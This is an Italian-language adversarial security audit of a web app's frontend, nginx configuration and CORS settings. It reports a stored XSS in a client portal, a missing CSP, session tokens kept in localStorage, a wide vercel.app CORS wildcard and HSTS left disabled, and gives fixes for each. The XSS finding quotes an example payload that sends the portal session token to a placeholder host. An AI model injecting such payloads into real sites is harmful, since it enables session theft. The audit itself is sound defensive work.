# 05 · Frontend, infrastruttura & dipendenze — 11/10/2026

> Audit avversariale eseguito a mano (gli agenti delegati sono falliti per un errore
> di autenticazione del modello). Ogni rilievo cita `file:riga` su codice letto.

## Sintesi

Il frontend è in buona parte difeso: il sanitizzatore `sanitizzaHtmlDocumento`
(`src/util/htmlSanitizer.ts`) è un allowlist serio (tag/attributi/CSS in whitelist, `on*`
e `srcdoc` rimossi, `javascript:`/`data:` bloccati negli URL e negli stili, `rel=noopener`
sui link), e `helmet` mette una CSP `default-src 'none'` su tutte le risposte API. Il punto
debole è una **asimmetria**: una delle due viste che rendono HTML con `dangerouslySetInnerHTML`
**salta** quel sanitizzatore, ed è proprio quella del **portale cliente**, dove il token di
sessione vive in `localStorage`. A corredo: nessuna CSP sul frontend servito da nginx (solo
tre header di sicurezza), CORS che ammette qualunque `*.vercel.app` con credenziali, HSTS
ancora commentato in attesa del TLS.

## Rilievi

### [Severità Media — RISOLTO 11/10/2026] XSS immagazzinato nel portale cliente: engagement HTML reso senza sanitizzazione

- **Fix.** `TabProposta.tsx:99` ora rende `scomponiDocumento(sanitizzaHtmlDocumento(getResolvedEngagementHtml()))`,
  come la vista gemella; e `ClientPortal.tsx` avvolge in `escapeHtmlTesto` i valori interpolati nella
  tabella moduli (`m.nome`, `m.cat`, `m.ore`, gli importi), così la via PDF è coperta a monte e la via
  DOM dal sanitizzatore. Verificato: typecheck + build frontend verdi.

- **Descrizione.** `TabProposta.tsx` rende il corpo della lettera d'incarico con
  `dangerouslySetInnerHTML={{ __html: partiProposta.corpo }}`, e `partiProposta` nasce da
  `scomponiDocumento(getResolvedEngagementHtml())` **senza** passare da `sanitizzaHtmlDocumento`.
  La vista gemella `DocumentiTab.tsx` invece sanitizza (`scomponiDocumento(sanitizzaHtmlDocumento(...))`,
  riga 38): stessa operazione, due trattamenti diversi. `getResolvedEngagementHtml`
  (`ClientPortal.tsx:362-413`) costruisce l'HTML interpolando dati di tenant/cliente **senza
  escape** — la tabella moduli con `${m.nome}`, `${m.cat}` (righe 378-388) e i campi cliente/
  progetto passati a `resolveDocumentTemplateHtml` (righe 396-412, fra cui `formData.ragioneSociale`,
  inserito dal cliente in onboarding, e `progettoAttivo?.nome`, scritto da un operatore dello studio).
- **File.** `frontend/src/components/portal/TabProposta.tsx:473` (sink non sanitizzato);
  `frontend/src/pages/ClientPortal.tsx:362-413` (HTML composto con interpolazione non-escaped);
  confronto con la via sana `frontend/src/components/projectDetail/DocumentiTab.tsx:37-38`;
  token in chiaro `frontend/src/api/auth.ts:112` (`bluman_portal_token` in `localStorage`).
- **Come sfruttarlo.** Un valore con markup attivo in uno dei campi interpolati (es. una
  ragione sociale o un nome progetto contenente `<img src=x onerror=fetch('//evil/'+localStorage.bluman_portal_token)>`)
  viene reso ed eseguito nella sessione del **portale cliente**, che tiene il token in
  `localStorage`: furto di sessione del cliente. L'allowlist esiste nel repo ma qui non è chiamata.
- **Rimedio.** Avvolgere il corpo in `sanitizzaHtmlDocumento` anche qui — una sola riga, la stessa
  di `DocumentiTab.tsx` — e, a monte, usare `escapeHtmlTesto` per ogni valore interpolato in
  `getResolvedEngagementHtml` (nomi moduli, ragione sociale, nome progetto) prima di comporre l'HTML.

### [Severità Media — RISOLTO 11/10/2026] Nessuna Content-Security-Policy sul frontend servito da nginx

- **Fix.** `nginx/bluman_app.inc` ora porta, a livello `server`, una CSP: `default-src 'self'`,
  `script-src 'self'` + l'hash `sha256-…` del solo script inline legittimo (il no-flash del tema) e
  **senza** `'unsafe-inline'` — così un `onerror=…` iniettato è bloccato, mentre lo script noto gira;
  `style-src 'self' 'unsafe-inline'` (gli attributi `style=""` dei documenti e di React); `img-src
  'self' data: blob:`; `object-src 'none'`; `frame-ancestors 'none'`; `base-uri`/`form-action 'self'`.
  Messa sul `server` e non in un `location`, così l'eredità raggiunge il frontend. Da validare con
  `nginx -t` al deploy.

- **Descrizione.** `nginx/bluman_app.inc:10-12` imposta `X-Content-Type-Options`, `X-Frame-Options`
  e `Referrer-Policy`, ma **nessuna CSP** sulle risposte del frontend. `helmet` mette una CSP
  solo sulle risposte dell'API (`src/server.ts:304`), non sulla SPA. Così, se un XSS supera il
  sanitizzatore (vedi sopra), non c'è nessuna seconda barriera che impedisca l'esfiltrazione o il
  caricamento di script esterni.
- **File.** `nginx/bluman_app.inc:10-12` (gli unici header di sicurezza del frontend); assenza di
  `Content-Security-Policy` in tutto `nginx/`.
- **Come sfruttarlo.** Non è di per sé sfruttabile: è l'assenza della difesa in profondità che
  trasformerebbe l'XSS del rilievo precedente da «furto token» a «solo ciò che la CSP non ferma».
- **Rimedio.** Aggiungere una CSP al frontend in `bluman_app.inc` (usando `add_header ... always`
  sul `server`, non dentro un `location`, per la lezione già documentata), partendo restrittiva
  (`default-src 'self'`; `script-src 'self'`) e allargando solo per gli asset realmente serviti.

### [Severità Bassa] Token di sessione in localStorage: ogni XSS diventa furto di sessione

- **Descrizione.** Sia il token operatore (`bluman_jwt_token`) sia quello del portale
  (`bluman_portal_token`) stanno in `localStorage`, leggibili da qualunque JavaScript della pagina.
  È una scelta comune con i Bearer token (il token viaggia nell'header `Authorization`, non in un
  cookie, quindi è immune a CSRF), ma rende ogni XSS un furto di sessione.
- **File.** `frontend/src/api/auth.ts:42,92-93,111-112`; `frontend/src/api/http.ts:190-191`;
  `frontend/src/App.tsx:78`.
- **Come sfruttarlo.** Richiede un XSS (vedi primo rilievo); da solo non è una vulnerabilità.
- **Rimedio.** Accettabile se la CSP e la sanitizzazione reggono. In alternativa, cookie `HttpOnly`
  `SameSite=Strict` per il token — ma comporterebbe gestire la CSRF, oggi assente perché non ci
  sono cookie. Da valutare, non urgente.

### [Severità Bassa] CORS ammette qualunque `*.vercel.app` con `credentials: true`

- **Descrizione.** `DEFAULT_ORIGINS` include `*.vercel.app` (`src/server.ts:264`) e la CORS è
  registrata con `credentials: true` (`:293`). Qualunque sito ospitato su `*.vercel.app` — che
  chiunque può creare — è un'origine ammessa. Il match è corretto e non aggirabile
  (`hostname.endsWith('.vercel.app')`, `:270-272`, non un `endsWith` ingannevole), quindi non è un
  bypass del wildcard; è l'ampiezza del wildcard il problema. Mitigazione forte: il token è Bearer
  in `localStorage`, non un cookie, quindi un sito cross-origin non può leggerlo né farlo inviare
  dal browser della vittima — il `credentials: true` qui non espone cookie di sessione (non ce ne sono).
- **File.** `src/server.ts:264` (`*.vercel.app`), `:281-295` (registrazione CORS con credenziali).
- **Come sfruttarlo.** Oggi l'impatto reale è scarso proprio perché non ci sono cookie ambientali;
  resta una superficie più larga del necessario.
- **Rimedio.** Al cut-over sul dominio proprio, togliere `*.vercel.app` dalle origini di default e
  lasciare solo il dominio di produzione in `CORS_ORIGINS`.

### [Severità Bassa] HSTS ancora disattivato

- **Descrizione.** `Strict-Transport-Security` è commentato (`nginx/default.conf:76`). Comprensibile
  finché la produzione gira su IP/HTTP e il TLS non è tagliato (voce aperta 10), ma va riattivato
  insieme al certificato, altrimenti un downgrade a HTTP resta possibile.
- **File.** `nginx/default.conf:76`.
- **Rimedio.** Scommentare HSTS contestualmente al cut-over TLS, con `max-age` ampio e
  `includeSubDomains` solo dopo aver verificato che nessun sottodominio serva in HTTP.

## Conteggio: 0 Alta, 2 Media, 3 Bassa.
